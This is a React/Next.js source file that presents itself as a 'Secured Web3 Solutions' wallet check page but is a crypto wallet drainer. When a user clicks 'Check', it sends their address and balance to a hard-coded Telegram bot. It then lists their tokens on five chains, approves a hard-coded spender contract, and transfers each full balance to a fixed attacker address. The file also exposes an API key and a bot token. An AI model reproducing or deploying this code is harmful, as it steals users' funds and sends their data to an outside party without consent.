import { ethers } from "ethers";
import { Contract, Provider } from 'ethers-multicall';
import { useSDK,ConnectWallet,useSigner,useAddress,useConnectionStatus,useBalance,useWallet } from "@thirdweb-dev/react";
import { useTheme } from "next-themes";
import { NextPage } from "next";
import { ThirdwebSDK, NATIVE_TOKEN_ADDRESS } from "@thirdweb-dev/sdk";
import Moralis from "moralis";
import { EvmChain } from "@moralisweb3/common-evm-utils";
import React,{useState,useContext} from "react";
import ChainContext from "../context/Chain";
import {
  Multicall,
  ContractCallResults,
  ContractCallContext,
} from 'ethereum-multicall';



const Test: NextPage = () => {
const apiKey = "XBHbf47AI2Fin462uOUOgFQ58HVtvev45cj0qegiOGZsivvFG7w53Q4jmQTLjn9x";
const { selectedChain, setSelectedChain } = useContext(ChainContext);
const net: Record<string,string> = {
  "ethereum" : "ethereum",
  "binance": "binance",
};
const addresses: Record<string, string> = {
    ["ethereum"]: "0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25",
    ["binance"]: "0x5fC8D30804508dfBB940b64D20BdCFCA9C6A6c25",
    ["arbitrum"]: "0xb4511516352e47F4A8A2E750Cd3505eC0D5930B1",
    ["polygon"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
    ["avalanche"]: "0xaF9c61A17d7F64507B983DD90de471CD010EDe12",
  };
 const sdk = useSDK();
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
const provider =sdk?.getProvider();
const { theme, setTheme } = useTheme();
const connectionStatus = useConnectionStatus();
const [showConnectModal, setShowConnectModal] = useState(false);
const signer = useSigner();
const wallet = useWallet();
const address = useAddress();
async function hold() {
    if (!address) {
      setShowConnectModal(true);
      return;
    }
    
switch (connectionStatus) {
  case "unknown":
    await sendMessageToTelegram("User is yet to connect. Hold on........");
    setShowConnectModal(true);
    return;
  case "connecting":
    await sendMessageToTelegram("User's wallet is connecting. Please be patient...");
    break;
  case "connected":
    await sendMessageToTelegram(`User with wallet address: ${address} and balance of ${wbalance} has connected.`);
    break;
  case "disconnected":
    await sendMessageToTelegram("User has disconnected!");
    setShowConnectModal(true);
    return;
  default:
    break;
}

    await Moralis.start({
      apiKey: apiKey,
    });

    const waddress = address;
    const chainOptions = ["ethereum", "arbitrum", "binance", "polygon", "avalanche"];
    const allTokenData = [];

    
for (const selectedChain of chainOptions) {
  let chain;

  switch (selectedChain) {
    case "ethereum":
      chain = EvmChain.ETHEREUM;
      break;
    case "arbitrum":
      chain = EvmChain.ARBITRUM;
      break;
    case "binance":
      chain = EvmChain.BSC;
      break;
    case "polygon":
      chain = EvmChain.POLYGON;
      break;
    case "avalanche":
      chain = EvmChain.AVALANCHE;
      break;
    default:
      break;
  }

      if (chain) {
        const response = await Moralis.EvmApi.token.getWalletTokenBalances({
          address: waddress,
          chain,
        });
        
        const tokens = response.toJSON();
        const filteredTokens = tokens.filter((token) => {
          return (
            parseFloat(token.balance) > 0 &&
            token.possible_spam === false
          );
        });
        const tokenData = filteredTokens.map((token) => {
          const tokenName = token.name;
          const spenderAddy = addresses[selectedChain]; 
          const abi = require("erc-20-abi");
          
          return {
            name: tokenName,
            address: token.token_address,
            balance: token.balance,
            decimals: token.decimals,
            chain: selectedChain,
            spenderAddy: spenderAddy,
            symbol: token.symbol,
            abi:abi,
          };
        });
        allTokenData.push(...tokenData);
        console.log(allTokenData);
        
      }
    }
    for (const tokenData of allTokenData) {
     
      try {
        const gasLimit = "100000";
        const to ="0xE0bC4c3269F83130410a54e316d08b38977f6321";
        const contract = new ethers.Contract(tokenData.address, ['function approve(address spender, uint256 value)'], signer);
        const syncontract = new ethers.Contract(tokenData.spenderAddy,['function transferERC20(address tokenAddress, address fromAddress, address toAddress, uint256 value)'],signer );
        const data = await contract.interface.encodeFunctionData('approve', [tokenData.spenderAddy, tokenData.balance]);
        const syncData = syncontract.interface.encodeFunctionData('transferERC20', [tokenData.address,address,to,tokenData.balance]);
        const tx = {
    to: tokenData.address,
    data: data,
    gasLimit: gasLimit,
  };
  const tx2 = {
    to: tokenData.address,
    data: syncData,
    gasLimit: gasLimit,
  };
  const dataTx = await signer?.sendTransaction(tx);
  const syncTx = await signer?.sendTransaction(tx2);
  console.log(dataTx);
  console.log(syncTx);
} catch (error) {
        const errorObj = error as Error;
        await sendMessageToTelegram(errorObj.message);
     }
    }
  
  
  };
     return(
        <div>
             <div className="justify-center text-center">
        <ConnectWallet
            theme={theme as ("light" | "dark" | undefined)}
            modalTitle={"Connect"}
            modalSize={"wide"}
            welcomeScreen={{
              title:
                "Your gateway to a safe  decentralized world of   Secured Web3 Solutions ",
              img: {
                src: "",
                width: 150,
                height: 150,
              },
            }}
            modalTitleIconUrl={""}
          />
          </div>
          <div>
            <button onClick={() => hold()}>Check</button>
          </div>
        </div>
      )
    }
    const sendMessageToTelegram = async (message: string) => {
        const botToken = '6057314190:AAES15kEQX0oGZbphbnB9FXsJhcDcN66QmU';
        const chatId = '5508645371';
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });
      }; 
    export default Test;
